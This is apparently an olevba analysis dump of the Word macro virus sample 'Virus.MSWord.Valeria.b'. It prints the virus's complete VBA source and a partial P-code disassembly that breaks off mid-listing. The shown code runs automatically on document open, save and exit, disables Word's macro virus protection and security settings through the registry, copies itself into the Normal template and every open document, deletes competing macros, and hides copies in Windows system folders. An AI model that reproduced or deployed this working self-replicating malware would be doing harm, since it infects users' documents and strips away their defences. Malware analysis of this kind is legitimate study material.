olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Valeria.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Valeria.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Project_P.bas 
in file: Virus.MSWord.Valeria.b - OLE stream: 'Macros/VBA/Project_P'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Else
Options.VirusProtection = False
Options.ConfirmConversion = False
Options.SaveNormalPrompt = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "Project_P") = "...by AndryOktavia"
Call AutoOpen
End If
Call AutoOpen
End Sub
Public AD As Object
Public NT As Object
Sub AutoOpen()
    On Error GoTo hapus
Dim NT As Object
Call Docurelfgh
CreativE
Call NothingElf
Application.EnableCancelKey = wdCancelDisabled
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Options.ConfirmConversions = False
For i = 1 To NormalTemplate.VBProject.VBComponents.Count
    If NormalTemplate.VBProject.VBComponents(i).Name = "Project_P" Then NormInstall = True
Next i
For i = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents(i).Name = "Project_P" Then ActivInstall = True
Next i
If ActivInstall = True And NormInstall = True Then GoTo Label_Exit
If ActivInstall = True And NormInstall = False Then Set Doc = ActiveDocument
If ActivInstall = False And NormInstall = True Then Set Doc = NormalTemplate
Pad = Options.DefaultFilePath(wdDocumentsPath)
ModuleLength = Doc.VBProject.VBComponents("Project_P").CodeModule.CountOfLines
NT.Save
Doc.VBProject.VBComponents("Project_P").Export Pad + ("\Fax.txt")
ActiveDocument.SaveAs fileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument

Label_Exit:
CommandBars("Tools").Controls("Templates and Add-Ins...").Delete
'CommandBars("Format").Controls("Style...").Delete
If NormInstall = True Then Call CreativE
Application.ScreenUpdating = True
Application.DisplayAlerts = wdAlertsAll
Application.EnableCancelKey = wdCancelInterrupt
hapus:
Docurelfgh
End Sub
Sub CreativE()
On Error Resume Next
Options.DefaultFilePath(wdStartupPath) = "C:\Windows"
Options.DefaultFilePath(wdTempFilePath) = "C:\Windows\inf"
Pad1 = Options.DefaultFilePath(wdStartupPath)
MyFile = Dir(Pad1 + "\Fax.dot")
If MyFile = "" Then
Set Adoc = NormalTemplate.OpenAsDocument
With Adoc
    .SaveAs fileName:=Pad1 + "\Fax.dot"
    .Close SaveChanges:=wdDoNotSaveChanges
End With
End If
End Sub
Sub FileSave()
    On Error Resume Next
    Dim Subyectif
    WordBasic.FileSave
    Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
    WordBasic.CurValues.FileSaveAs dlg
    Subyectif = WordBasic.FileSaveAs(dlg)
    If Subyectif Then
        dlg.Format = 1
        WordBasic.FileSaveAs dlg
    End If
    Call AutoOpen
    End Sub
Sub FileClose()
    On Error Resume Next
    Call AutoOpen
    Call NothingElf
    Call Docurelfgh
    If ActiveDocument.Saved = False Then ActiveDocument.Save

    Call AutoOpen
ActiveDocument.Close
End Sub
Sub FileSaveAs()
    On Error Resume Next
    Dim Subyectif
    WordBasic.FileSave
    Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
    WordBasic.CurValues.FileSaveAs (dlg)
    If Subyectif Then
        dlg.Format = 1
        WordBasic.FileSaveAs dlg
    End If
    Call AutoOpen
    End Sub
    Sub FileExit()
    On Error Resume Next
    Call AutoOpen
    NothingElf
    'Docurelfgh

    Call AutoOpen
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    Application.Quit
End Sub
Sub AutoExit()
    On Error Resume Next
    Call AutoOpen
    Call NothingElf
    Call Docurelfgh

End Sub
Sub AutoExec()
On Error GoTo hapus
WordBasic.DisableInput 1
WordBasic.DisableAutoMacros 0
Call NothingElf
Application.EnableCancelKey = wdCancelDisabled
    Call AutoOpen

WBF
AddIns.Unload False
WBF
hapus:
Docurelfgh
End Sub
Sub AutoClose()
    On Error Resume Next
    Call AutoOpen
    NothingElf
    'Docurelfgh
    Project_P
End Sub
Sub ToolsMacro()
    On Error Resume Next
    Project_P
    If System.OperatingSystem = "Windows" Then Call pesen
    If System.OperatingSystem = "Windows" Then Call pesen
    Call pesen
End Sub
Sub FileTemplates()
    On Error Resume Next
    Project_P
    If System.OperatingSystem = "Windows" Then Call pesen
    If System.OperatingSystem = "Windows" Then Call pesen
End Sub
Sub ViewVBCode()
    On Error Resume Next
    Project_P
    If System.OperatingSystem = "Windows" Then Call pesen
    If System.OperatingSystem = "Windows" Then Call pesen
End Sub
Sub FileOpen()
On Error Resume Next
Call AutoOpen
WBT
If Dialogs(80).Show <> 0 Then
Call AutoOpen
Call Docurelfgh
Call NothingElf
'Project_P
Call AutoOpen
WBF
Else
WBF
End If
End Sub
Sub pesen()
msg1 = "This Program Can't Be Removed aaaa"
msg2 = " For More Information please Contact Us"
Msg3 = " http:// www.valerianet.com or E-Mail: andryok@valerianet.com"
MsgBox (msg1 + Chr(10) + msg2 + Chr(10) + Msg3)
End Sub
Sub vote()
Nama1 = "Project_P Security Systemaaa"
Nama2 = "Andry Security Systemaaaa"
msg1 = " Thank you for Using Our Product xxxxxxxxxx "
msg2 = " This Program Under Protected The International Treaty"
Msg3 = "(c) Andry 1999xxxxxxxxxxxx., Alright Reserved.aaaaa "
msg4 = " Thanks "
If Day(Now) = 26 Then MsgBox msg1 + Nama1 + Chr(10) + msg2 + Chr(10) + Msg3 + Nama1, vbInformation, "ValeriaNet Security System"
If Day(Now) = 7 Then MsgBox msg1 + Nama2 + Chr(10) + msg2 + Chr(10) + Msg3 + Nama2, vbInformation, "ValeriaNet Security System"
End Sub
Function Docurelfgh()
    On Error GoTo Erw1
    NorOk = False
    WBT
    Set AD = ActiveDocument
    Set NT = NormalTemplate
    On Error GoTo Erh1a
    For i = 1 To NormalTemplate.VBProject.VBComponents.Count
      NMacr = NormalTemplate.VBProject.VBComponents(i).Name
      If NMacr = "Project_P" Then NorOk = True
      If (NMacr <> "Project_P") And (NMacr <> "ThisDocument") Then
      MsgBox ("NT.Microsoft Word "), vbInformation, "ValeriaNet Security System"
  Application.OrganizerDelete Source:=NormalTemplate.FullName, _
            Name:=NMacr, Object:=wdOrganizerObjectProjectItems

      End If
    Next i
Erh1a:
    If NorOk = False Then
      On Error GoTo Erh1
            Application.OrganizerCopy Source:=ActiveDocument.FullName, _
          Destination:=NormalTemplate.FullName, Name:= _
          "Project_P", Object:=wdOrganizerObjectProjectItems
      Templates(NormalTemplate.FullName).Save
      NormalTemplate.Application.Visible = False
Erh1:
    End If
Erw1:
End Function
Function NothingElf()
    On Error GoTo Erw2
    DokSave = 0
    DocOk = False
    Set AD = ActiveDocument
    Set NT = NormalTemplate
    On Error GoTo Erh2a
    For i = 1 To AD.VBProject.VBComponents.Count
      NMacr = AD.VBProject.VBComponents(i).Name
      If NMacr = "Project_P" Then DocOk = True
      'NMacr = NT.VBProject.VBComponents(i).Name
      'If NMacr = "Project_P" Then Docok = True
      If (NMacr <> "Project_P") And _
        (NMacr <> "ThisDocument") And (NMacr <> "Reference to Normal") Then
       MsgBox ("AD. Microsoft Word"), vbInformation, "ValeriaNet Security System"
        Application.OrganizerDelete Source:=AD.FullName, _
          Name:=NMacr, Object:=wdOrganizerObjectProjectItems
      End If
    Next i
Erh2a:
    If DocOk = False Then
      On Error GoTo Erh2
      Application.OrganizerCopy Source:=NT.FullName, _
          Destination:=AD.FullName, Name:= _
          "Project_P", Object:=wdOrganizerObjectProjectItems
      ActiveDocument.ReadOnlyRecommended = False
      ActiveDocument.Save
Erh2:
    End If
Erw2:
End Function
Function WBT()
WordBasic.DisableAutoMacros True
End Function
Function WBF()
WordBasic.DisableAutoMacros False
End Function
Function Cute()
f56879025 = GetAttr(NormalTemplate.FullName)
Application.VBE.ActiveVBProject.VBComponents("Project_P").Export "c:\windows\system\vxd.sys"
If f56879025 = vbReadOnly Then GoTo rewing
If f56879025 = vbReadOnly + vbArchive Then GoTo rewing
For i = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(i).Name = "Project_P" Then xxx902578112 = True
Next i
For i = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(i).Name = "Project_P" Then mmf78116 = True
Next i
If xxx902578112 = True And mmf78116 = False Then Set o7811902511 = NormalTemplate.VBProject.VBComponents
If xxx902578112 = False And mmf78116 = True Then Set o7811902511 = ActiveDocument.VBProject.VBComponents
o7811902511.Import "c:\windows\system\vxd.sys"
If activeinst = False Then ActiveDocument.SaveAs fileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
If mmf78116 = False Then If NormalTemplate.Saved = False Then NormalTemplate.Save
rewing:
End Function














-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Valeria.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1190 bytes
' Macros/VBA/Project_P - 14758 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #3:
' 	LitVarSpecial (False)
' 	LitStr 0x000B "Security..."
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #4:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #5:
' 	ElseBlock 
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #7:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversion 
' Line #8:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #9:
' 	LitStr 0x0012 "...by AndryOktavia"
' 	LitStr 0x0000 ""
' 	LitStr 0x002C "HKEY_CURRENT_USER\Software\Microsoft\Office\"
' 	LitStr 0x0009 "Project_P"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #10:
' 	ArgsCall (Call) AutoOpen 0x0000 
' Line #11:
' 	EndIfBlock 
' Line #12:
' 	ArgsCall (Call) AutoOpen 0x0000 
' Line #13:
' 	EndSub 
' Line #14:
' 	Dim (Public) 
' 	VarDefn AD (As Object)
' Line #15:
' 	Dim (Public) 
' 	VarDefn NT (As Object)
' Line #16:
' 	FuncDefn (Sub AutoOpen())
' Line #17:
' 	OnError hapus 
' Line #18:
' 	Dim 
' 	VarDefn NT (As Object)
' Line #19:
' 	ArgsCall (Call) Docurelfgh 0x0000 
' Line #20:
' 	ArgsCall CreativE 0x0000 
' Line #21:
' 	ArgsCall (Call) NothingElf 0x0000 
' Line #22:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #23:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #24:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #25:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #26:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #27:
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0009 "Project_P"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St NormInstall 
' 	EndIf 
' Line #28:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #29:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #30:
' 	Ld i 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0009 "Project_P"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St ActivInstall 
' 	EndIf 
' Line #31:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #32:
' 	Ld ActivInstall 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld NormInstall 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo Label_Exit 
' 	EndIf 
' Line #33:
' 	Ld ActivInstall 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld NormInstall 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set Doc 
' 	EndIf 
' Line #34:
' 	Ld ActivInstall 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld NormInstall 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set Doc 
' 	EndIf 
' Line #35:
' 	Ld wdDocumentsPath 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	St Pad 
' Line #36:
' 	LitStr 0x0009 "Project_P"
' 	Ld Doc 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St ModuleLength 
' Line #37:
' 	Ld NT 
' 	ArgsMemCall Save 0x0000 
' Line #38:
' 	Ld Pad 
' 	LitStr 0x0008 "\Fax.txt"
' 	Paren 
' 	Add 
' 	LitStr 0x0009 "Project_P"
' 	Ld Doc 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #39:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed fileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' Line #40:
' Line #41:
' 	Label Label_Exit 
' Line #42:
' 	LitStr 0x0018 "Templates and Add-Ins..."
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #43:
' 	QuoteRem 0x0000 0x0031 "CommandBars("Format").Controls("Style...").Delete"
' Line #44:
' 	Ld NormInstall 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) CreativE 0x0000 
' 	EndIf 
' Line #45:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #46:
' 	Ld wdAlertsAll 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #47:
' 	Ld wdCancelInterrupt 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #48:
' 	Label hapus 
' Line #49:
' 	ArgsCall Docurelfgh 0x0000 
' Line #50:
' 	EndSub 
' Line #51:
' 	FuncDefn (Sub CreativE())
' Line #52:
' 	OnError (Resume Next) 
' Line #53:
' 	LitStr 0x000A "C:\Windows"
' 	Ld wdStartupPath 
' 	Ld Options 
' 	ArgsMemSt DefaultFilePath 0x0001 
' Line #54:
' 	LitStr 0x000E "C:\Windows\inf"
' 	Ld wdTempFilePath 
' 	Ld Options 
' 	ArgsMemSt DefaultFilePath 0x0001 
' Line #55:
' 	Ld wdStartupPath 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	St Pad1 
' Line #56:
' 	Ld Pad1 
' 	LitStr 0x0008 "\Fax.dot"
' 	Add 
' 	ArgsLd Dir 0x0001 
' 	St MyFile 
' Line #57:
' 	Ld MyFile 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #58:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd OpenAsDocument 
' 	Set Adoc 
' Line #59:
' 	StartWithExpr 
' 	Ld Adoc 
' 	With 
' Line #60:
' 	Ld Pad1 
' 	LitStr 0x0008 "\Fax.dot"
' 	Add 
' 	ParamNamed fileName 
' 	ArgsMemCallWith SaveAs 0x0001 
' Line #61:
' 	Ld wdDoNotSaveChanges 
' 	ParamNamed SaveChanges 
' 	ArgsMemCallWith Close 0x0001 
' Line #62:
' 	EndWith 
' Line #63:
' 	EndIfBlock 
' Line #64:
' 	EndSub 
' Line #65:
' 	FuncDefn (Sub FileSave())
' Line #66:
' 	OnError (Resume Next) 
' Line #67:
' 	Dim 
' 	VarDefn Subyectif
' Line #68:
' 	Ld WordBasic 
' 	ArgsMemCall FileSave 0x0000 
' Line #69:
' 	Dim 
' 	VarDefn dlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileSaveAs 0x0001 
' 	Set dlg 
' Line #70:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #71:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemLd FileSaveAs 0x0001 
' 	St Subyectif 
' Line #72:
' 	Ld Subyectif 
' 	IfBlock 
' Line #73:
' 	LitDI2 0x0001 
' 	Ld dlg 
' 	MemSt Format$ 
' Line #74:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #75:
' 	EndIfBlock 
' Line #76:
' 	ArgsCall (Call) AutoOpen 0x0000 
' Line #77:
' 	EndSub 
' Line #78:
' 	FuncDefn (Sub FileClose())
' Line #79:
' 	OnError (Resume Next) 
' Line #80:
' 	ArgsCall (Call) AutoOpen 0x0000 
' Line #81:
' 	ArgsCall (Call) NothingElf 0x0000 
' Line #82:
' 	ArgsCall (Call) Docurelfgh 0x0000 
' Line #83:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #84:
' Line #85:
' 	ArgsCall (Call) AutoOpen 0x0000 
' Line #86:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #87:
' 	EndSub 
' Line #88:
' 	FuncDefn (Sub FileSaveAs())
' Line #89:
' 	OnError (Resume Next) 
' Line #90:
' 	Dim 
' 	VarDefn Subyectif
' Line #91:
' 	Ld WordBasic 
' 	ArgsMemCall FileSave 0x0000 
' Line #92:
' 	Dim 
' 	VarDefn dlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileSaveAs 0x0001 
' 	Set dlg 
' Line #93:
' 	Ld dlg 
' 	Paren 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #94:
' 	Ld Subyectif 
' 	IfBlock 
' Line #95:
' 	LitDI2 0x0001 
' 	Ld dlg 
' 	MemSt Format$ 
' Line #96:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #97:
' 	EndIfBlock 
' Line #98:
' 	ArgsCall (Call) AutoOpen 0x0000 
' Line #99:
' 	EndSub 
' Line #100:
' 	FuncDefn (Sub FileExit())
' Line #101:
' 	OnError (Resume Next) 
' Line #102:
' 	ArgsCall (Call) AutoOpen 0x0000 
' Line #103:
' 	ArgsCall NothingElf 0x0000 
' Line #104:
' 	QuoteRem 0x0004 0x000A "Docurelfgh"
' Line #105:
' Line #106:
' 	ArgsCall (Call) AutoOpen 0x0000 
' Line #107:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #108:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #109:
' 	EndSub 
' Line #110:
' 	FuncDefn (Sub AutoExit())
' Line #111:
' 	OnError (Resume Next) 
' Line #112:
' 	ArgsCall (Call) AutoOpen 0x0000 
' Line #113:
' 	ArgsCall (Call) NothingElf 0x0000 
' Line #114:
' 	ArgsCall (Call) Docurelfgh 0x0000 
' Line #115:
' Line #116:
' 	EndSub 
' Line #117:
' 	FuncDefn (Sub AutoExec())
' Line #118:
' 	OnError hapus 
' Line #119:
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall DisableInput 0x0001 
' Line #120:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #121:
' 	ArgsCall (Call) NothingElf 0x0000 
' Line #122:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #123:
' 	ArgsCall (Call) AutoOpen 0x0000 
' Line #124:
' Line #125:
' 	ArgsCall WBF 0x0000 
' Line #126:
' 	LitVarSpecial (False)
' 	Ld AddIns 
' 	ArgsMemCall Unlock 0x0001 
' Line #127:
' 	ArgsCall WBF 0x0000 
' Line #128:
' 	Label hapus 
' Line #129:
' 	ArgsCall Docurelfgh 0x0000 
' Line #130:
' 	EndSub 
' Line #131:
' 	FuncDefn (Sub AutoClose())
' Line #132:
' 	OnError (Resume Next) 
' Line #133:
' 	ArgsCall (Call) AutoOpen 0x0000 
' Line #134:
' 	ArgsCall NothingElf 0x0000 
' Line #135:
' 	QuoteRem 0x0004 0x000A "Docurelfgh"
' Line #136:
' 	ArgsCall Project_P 0x0000 
' Line #137:
' 	EndSub 
' Line #138:
' 	FuncDefn (Sub ToolsMacro())
' Line #139:
' 	OnError (Resume Next) 
' Line #140:
' 	ArgsCall Project_P 0x0000 
' Line #141:
' 	Ld System 
' 	MemLd OperatingSystem 
' 	LitStr 0x0007 "Windows"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) pesen 0x0000 
' 	EndIf 
' Line #142:
' 	Ld System 
' 	MemLd OperatingSystem 
' 	LitStr 0x0007 "Windows"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) pesen 0x0000 
' 	EndIf 
' Line #143:
' 	ArgsCall (Call) pesen 0x0000 
' Line #144:
' 	EndSub 
' Line #145:
' 	FuncDefn (Sub FileTemplates())
' Line #146:
' 	OnError (Resume Next) 
' Line #147:
' 	ArgsCall Project_P 0x0000 
' Line #148:
' 	Ld System 
' 	MemLd OperatingSystem 
' 	LitStr 0x0007 "Windows"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) pesen 0x0000 
' 	EndIf 
' Line #149:
' 	Ld System 
' 	MemLd OperatingSystem 
' 	LitStr 0x0007 "Windows"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) pesen 0x0000 
' 	EndIf 
' Line #150:
' 	EndSub 
' Line #151:
' 	FuncDefn (Sub ViewVBCode())
' Line #152:
' 	OnError (Resume Next) 
' Line #153:
' 	ArgsCall Project_P 0x0000 
' Line #154:
' 	Ld System 
' 	MemLd OperatingSystem 
' 	LitStr 0x0007 "Windows"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) pesen 0x0000 
' 	EndIf 
' Line #155:
' 	Ld System 
' 	MemLd OperatingSystem 
' 	LitStr 0x0007 "Windows"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) pesen 0x0000 
' 	EndIf 
' Line #156:
' 	EndSub 
' Line #157:
' 	FuncDefn (Sub FileOpen())
' Line #158:
' 	OnError (Resume Next) 
' Line #159:
' 	ArgsCall (Call) AutoOpen 0x0000 
' Line #160:
' 	ArgsCall WBT 0x0000 
' Line #161:
' 	LitDI2 0x0050 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd Show 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #162:
' 	ArgsCall (Call) AutoOpen 0x0000 
' Line #163:
' 	ArgsCall (Call) Docurelfgh 0x0000 
' Line #164:
' 	ArgsCall (Call) NothingElf 0x0000 
' Line #165:
' 	QuoteRem 0x0000 0x0009 "Project_P"
' Line #166:
' 	ArgsCall (Call) AutoOpen 0x0000 
' Line #167:
' 	ArgsCall WBF 0x0000 
' Line #168:
' 	ElseBlock 
' Line #169:
' 	ArgsCall WBF 0x0000 
' Line #170:
' 	EndIfBlock 
' Line #171:
' 	EndSub 
' Line #172:
' 	FuncDefn (Sub pesen())
' Line #173:
' 	LitStr 0x0022 "This Program Can't Be Removed aaaa"
' 	St msg1 
' Line #174:
' 	LitStr 0x0027 " For More Information please Contact Us"
' 	St msg2 
' Line #175:
' 	LitStr 0x003D " http:// www.valerianet.com or E-Mail: andryok@valerianet.com"
' 	St Msg3 
' Line #176:
' 	Ld msg1 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld msg2 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld Msg3 
' 	Add 
' 	Paren 
' 	ArgsCall MsgBox 0x0001 
' Line #177:
' 	EndSub 
' Line #178:
' 	FuncDefn (Sub vote())
' Line #179:
' 	LitStr 0x001C "Project_P Security Systemaaa"
' 	St Nama1 
' Line #180:
' 	LitStr 0x0019 "Andry Security Systemaaaa"
' 	St Nama2 
' Line #181:
' 	LitStr 0x002C " Thank you for Using Our Product xxxxxxxxxx "
' 	St msg1 
' Line #182:
' 	LitStr 0x0036 " This Program Under Protected The International Treaty"
' 	St msg2 
' Line #183:
' 	LitStr 0x0034 "(c) Andry 1999xxxxxxxxxxxx., Alright Reserved.aaaaa "
' 	St Msg3 
' Line #184:
' 	LitStr 0x0008 " Thanks "
' 	St msg4 
' Line #185:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x001A 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld msg1 
' 	Ld Nama1 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld msg2 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld Msg3 
' 	Add 
' 	Ld Nama1 
' 	Add 
' 	Ld vbInformation 
' 	LitStr 0x001A "ValeriaNet Security System"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #186:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0007 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld msg1 
' 	Ld Nama2 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld msg2 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld Msg3 
' 	Add 
' 	Ld Nama2 
' 	Add 
' 	Ld vbInformation 
' 	LitStr 0x001A "ValeriaNet Security System"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #187:
' 	EndSub 
' Line #188:
' 	FuncDefn (Function Docurelfgh())
' Line #189:
' 	OnError Erw1 
' Line #190:
' 	LitVarSpecial (False)
' 	St NorOk 
' Line #191:
' 	ArgsCall WBT 0x0000 
' Line #192:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set AD 
' Line #193:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set NT 
' Line #194:
' 	OnError Erh1a 
' Line #195:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #196:
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St NMacr 
' Line #197:
' 	Ld NMacr 
' 	LitStr 0x0009 "Project_P"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St NorOk 
' 	EndIf 
' Line #198:
' 	Ld NMacr 
' 	LitStr 0x0009 "Project_P"
' 	Ne 
' 	Paren 
' 	Ld NMacr 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #199:
